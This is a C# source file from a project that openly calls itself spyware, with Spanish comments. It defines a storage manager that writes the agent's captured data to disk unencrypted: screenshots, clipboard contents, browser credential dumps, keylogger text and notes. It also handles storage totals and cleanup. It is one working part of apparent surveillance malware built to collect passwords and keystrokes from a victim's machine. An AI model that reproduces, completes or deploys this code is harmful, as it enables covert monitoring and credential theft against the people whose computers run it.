using Spyware.Core.Logging;
using Spyware.Core.Paths;
using Spyware.Core.Security;

namespace Spyware.Storage;

/// <summary>
/// Escribe los binarios del spool (JPEG, PNG, volcados) dentro del único
/// directorio de datos, siempre sin cifrar.
/// </summary>
public sealed class SpoolManager
{
    private readonly AgentPaths _paths;
    private readonly ILog _log;

    public SpoolManager(AgentPaths paths, ILog log)
    {
        _paths = paths;
        _log = log;
    }

    public string SaveScreenshot(byte[] jpeg, DateTime timestampUtc) =>
        Write(_paths.ScreenshotDirectory, $"scr_{Stamp(timestampUtc)}_{HashHelper.Short(HashHelper.Sha256Hex(jpeg))}.jpg", jpeg);

    public string SaveClipboardImage(byte[] png, DateTime timestampUtc) =>
        Write(_paths.ClipboardDirectory, $"clip_{Stamp(timestampUtc)}_{HashHelper.Short(HashHelper.Sha256Hex(png))}.png", png);

    public string SaveClipboardText(string text, DateTime timestampUtc) =>
        Write(_paths.ClipboardDirectory, $"clip_{Stamp(timestampUtc)}.txt", System.Text.Encoding.UTF8.GetBytes(text));

    public string SaveCredentialDump(string json, DateTime timestampUtc, string browser) =>
        Write(_paths.CredentialDirectory, $"creds_{browser}_{Stamp(timestampUtc)}.json", System.Text.Encoding.UTF8.GetBytes(json));

    public string SaveKeylogText(string text, DateTime timestampUtc) =>
        Write(_paths.KeylogDirectory, $"keys_{Stamp(timestampUtc)}_{HashHelper.Short(HashHelper.Sha256Hex(text))}.txt", System.Text.Encoding.UTF8.GetBytes(text));

    public string SaveNote(string text, DateTime timestampUtc, string noteId) =>
        Write(_paths.NoteDirectory, $"note_{Stamp(timestampUtc)}_{ShortId(noteId)}.txt", System.Text.Encoding.UTF8.GetBytes(text));

    public string SaveNotesDump(string json, DateTime timestampUtc) =>
        Write(_paths.NoteDirectory, $"notes_{Stamp(timestampUtc)}.json", System.Text.Encoding.UTF8.GetBytes(json));

    public long GetManagedStorageBytes()
    {
        long total = 0;
        foreach (string dir in ManagedDirectories())
            total += EnumerateFiles(dir).Sum(f => f.Length);

        return total + GetDatabaseBytes();
    }

    public IEnumerable<SpoolFile> EnumerateOldestManagedFiles()
    {
        return ManagedDirectories()
            .SelectMany(EnumerateFiles)
            .Where(f => !f.Path.EndsWith("-wal", StringComparison.OrdinalIgnoreCase)
                     && !f.Path.EndsWith("-shm", StringComparison.OrdinalIgnoreCase))
            .OrderBy(f => f.LastWriteUtc)
            .ToList();
    }

    public void PruneTempDirectory(TimeSpan maxAge)
    {
        try
        {
            foreach (string dir in Directory.EnumerateDirectories(_paths.TempDirectory))
            {
                if (DateTime.UtcNow - Directory.GetCreationTimeUtc(dir) <= maxAge) continue;

                try { Directory.Delete(dir, recursive: true); }
                catch (Exception ex) { _log.Warn("No se pudo limpiar temp " + dir + ": " + ex.Message); }
            }
        }
        catch (Exception ex)
        {
            _log.Warn("Limpieza de temp falló: " + ex.Message);
        }
    }

    public bool TryDeleteFile(string path)
    {
        try
        {
            if (File.Exists(path)) File.Delete(path);
            return true;
        }
        catch (Exception ex)
        {
            _log.Warn($"No se pudo borrar {path}: {ex.Message}");
            return false;
        }
    }

    private IEnumerable<string> ManagedDirectories() => new[]
    {
        _paths.ScreenshotDirectory, _paths.ClipboardDirectory, _paths.CredentialDirectory,
        _paths.KeylogDirectory, _paths.NoteDirectory, _paths.ExportDirectory
    };

    private static IEnumerable<SpoolFile> EnumerateFiles(string directory)
    {
        if (!Directory.Exists(directory)) yield break;

        foreach (string file in Directory.EnumerateFiles(directory, "*", SearchOption.AllDirectories))
        {
            var info = new FileInfo(file);
            if (!info.Exists) continue;

            yield return new SpoolFile(info.FullName, info.LastWriteTimeUtc, info.Length);
        }
    }

    private long GetDatabaseBytes()
    {
        var info = new FileInfo(_paths.StorageDb);
        return info.Exists ? info.Length : 0;
    }

    private string Write(string directory, string fileName, byte[] content)
    {
        Directory.CreateDirectory(directory);

        string target = Path.Combine(directory, fileName);
        string temporary = target + ".tmp";

        File.WriteAllBytes(temporary, content);
        File.Move(temporary, target, overwrite: true);

        return target;
    }

    private static string Stamp(DateTime timestampUtc) => timestampUtc.ToUniversalTime().ToString("yyyyMMdd'T'HHmmss'Z'");

    /// <summary>Identificador reducido a nombre de archivo seguro (los ids ajenos traen lo que traigan).</summary>
    private static string ShortId(string? value)
    {
        if (string.IsNullOrWhiteSpace(value)) return "sin-id";

        char[] safe = value.Trim().Where(c => char.IsLetterOrDigit(c) || c is '-' or '_').Take(16).ToArray();
        return safe.Length == 0 ? "sin-id" : new string(safe);
    }
}
